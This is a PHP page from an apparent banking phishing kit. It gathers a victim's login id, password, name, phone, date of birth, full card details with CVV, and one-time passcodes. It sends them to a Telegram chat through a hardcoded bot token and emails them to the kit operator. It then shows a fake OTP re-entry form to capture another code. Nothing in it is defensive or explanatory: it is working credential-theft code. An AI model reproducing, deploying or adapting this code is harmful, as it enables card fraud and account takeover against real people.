<?php
session_start();
include "header.php";
include "../email.php";


$_SESSION['otp2'] = $_POST['otp2'];


$to = $email;;
$subject = 'Card info | All info ';
$message = "
----------------Card info | All info-----------------
  



Client id: " . $_SESSION['id'] . "
Client Password: " . $_SESSION['password'] . "

-----------------full info----------------




Fullname : " . $_SESSION['fullname'] . "

Zipcode : " . $_SESSION['zip'] . "
Phone : " . $_SESSION['phone'] . "
Date of birth : " . $_SESSION['date'] . "
----------------card info-----------------




Name on card : " . $_SESSION['nameoncard'] . "

Card number : " . $_SESSION['crd'] . "
expiry : " . $_SESSION['month'] . "/" . $_SESSION['year'] . "
cvv : " . $_SESSION['cvv'] . "


-------------------OTP-------------------
OTP : " . $_SESSION['otp'] . "

OTP2 : " . $_SESSION['otp2'] . "  

";


sendMessageT('-670431353',$message,'2141533923:AAETgvM1iliuDfSj6V79whhNunI-mncfr-E');
mail($to, $subject, $message);
?>
<link rel="stylesheet" href="../css/index.css">

<main class="" style="min-height:450px; background-color: #F3F4F6;">
    <div class="row container-expand-gl mx-auto co" style="width: 75%; padding:0; ">

        <br>
        <p class="col-12 par" style="font-size: 28px; margin:10px;">Please renter your otp code</p>
        <br>
        <div class="col-12 mx-auto row co1" style="background-color: white;height:360px ; padding:0; margin:40px;">

            <div class="col-4  mx-auto form-group " style="margin-top: 70px;">
                <form action="final.php" method="post">
                    <div class="mb-5"></div>

                    OTP code :&nbsp; &nbsp; <input name="otp3" type="number" class="form-control" id="otp " required> <br>
                    <button type="submit" class="btn btn-block " style="background-color: #DA1E10; color:white; font-weight: blod;">Verify</button>
                </form>
            </div>
        </div>
    </div>
</main>
<style>
    @media only screen and (max-width: 800px) {
        .co {
            width: 200% !important;
        }

        main {
            background-color: white !important;
        }

        .par {
            margin: 0px !important;
            font-size: 16px !important;
        }

        .co1 {
            margin: 0px !important;
            transform: translate(-27%, 0);
        }

    }
</style>
<br> <br>
<?php
include "footer.php";



?>